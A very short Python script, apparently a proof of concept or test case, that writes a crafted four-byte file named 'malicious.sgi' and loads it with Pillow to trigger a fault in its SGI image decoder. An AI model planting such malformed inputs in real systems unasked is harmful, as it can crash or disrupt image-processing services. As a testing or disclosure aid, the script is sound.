from PIL import Image

with open("malicious.sgi", "wb") as f:
    f.write(b"\x01\x01\x01\x01")

img = Image.open("malicious.sgi")

img.load()